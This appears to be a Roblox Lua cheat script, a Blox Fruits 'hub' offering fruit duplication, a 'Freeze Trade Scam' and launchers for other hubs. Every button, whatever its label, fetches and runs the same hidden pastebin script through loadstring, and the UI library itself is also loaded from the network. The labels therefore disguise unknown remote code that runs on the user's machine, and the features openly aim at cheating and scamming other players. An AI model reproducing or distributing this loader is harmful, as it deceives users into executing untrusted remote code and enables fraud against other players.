-- Booting the Library
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

-- Creating the Main Window
local Window = OrionLib:MakeWindow({
    Name = "SMN'S HUB",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "BloxFruitConfig",
    IntroEnabled = true,
    IntroText = "Welcome to SMN'S HUB",
})

-- Creating Tabs
local MainTab = Window:MakeTab({
    Name = "Main Features",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

local OtherScriptsTab = Window:MakeTab({
    Name = "Other Scripts",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Creating Sections
local DupeSection = MainTab:AddSection({ Name = "Dupe Fruit" })
local ExtraSection = MainTab:AddSection({ Name = "Extra Features" })
local OtherScriptsSection = OtherScriptsTab:AddSection({ Name = "Other Hubs" })

-- Script to Execute
local function executeScript()
    loadstring(game:HttpGet("https://pastebin.com/raw/dpNcLwhx"))()
end

-- Dupe Fruit Feature
local selectedNumber = nil
DupeSection:AddTextbox({
    Name = "Enter Dupe Number",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        selectedNumber = tonumber(Value)
        print("Selected Dupe Number: " .. tostring(selectedNumber))
    end
})

DupeSection:AddButton({
    Name = "Start Dupe",
    Callback = function()
        if selectedNumber then
            print("Starting dupe with number: " .. selectedNumber)
            OrionLib:MakeNotification({
                Name = "Dupe Started",
                Content = "Dupe initiated with number " .. selectedNumber,
                Image = "rbxassetid://4483345998",
                Time = 5
            })
            executeScript()
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Please enter a valid number first!",
                Image = "rbxassetid://4483345998",
                Time = 5
            })
        end
    end
})

-- Additional Features
ExtraSection:AddButton({
    Name = "All in Stock",
    Callback = function()
        print("All in Stock activated")
        OrionLib:MakeNotification({
            Name = "Feature Activated",
            Content = "All in Stock is now active!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        executeScript()
    end
})

ExtraSection:AddButton({
    Name = "Freeze Trade Scam",
    Callback = function()
        print("Freeze Trade Scam activated")
        OrionLib:MakeNotification({
            Name = "Feature Activated",
            Content = "Freeze Trade Scam is now active!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        executeScript()
    end
})

ExtraSection:AddButton({
    Name = "Auto Farm",
    Callback = function()
        print("Auto Farm activated")
        OrionLib:MakeNotification({
            Name = "Feature Activated",
            Content = "Auto Farm is now active!",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        executeScript()
    end
})

-- Other Scripts Tab Buttons
OtherScriptsSection:AddButton({
    Name = "Hoho Hub",
    Callback = function()
        print("Hoho Hub executed")
        OrionLib:MakeNotification({
            Name = "Hoho Hub",
            Content = "Executing Hoho Hub...",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        executeScript()
    end
})

OtherScriptsSection:AddButton({
    Name = "Banana Hub (Keyless)",
    Callback = function()
        print("Banana Hub executed")
        OrionLib:MakeNotification({
            Name = "Banana Hub",
            Content = "Executing Banana Hub...",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        executeScript()
    end
})

OtherScriptsSection:AddButton({
    Name = "Redz Hub",
    Callback = function()
        print("Redz Hub executed")
        OrionLib:MakeNotification({
            Name = "Redz Hub",
            Content = "Executing Redz Hub...",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        executeScript()
    end
})

OtherScriptsSection:AddButton({
    Name = "Speed Hub",
    Callback = function()
        print("Speed Hub executed")
        OrionLib:MakeNotification({
            Name = "Speed Hub",
            Content = "Executing Speed Hub...",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        executeScript()
    end
})

OtherScriptsSection:AddButton({
    Name = "W-Azure",
    Callback = function()
        print("W-Azure executed")
        OrionLib:MakeNotification({
            Name = "W-Azure",
            Content = "Executing W-Azure...",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        executeScript()
    end
})

-- Finishing the script
OrionLib:Init()
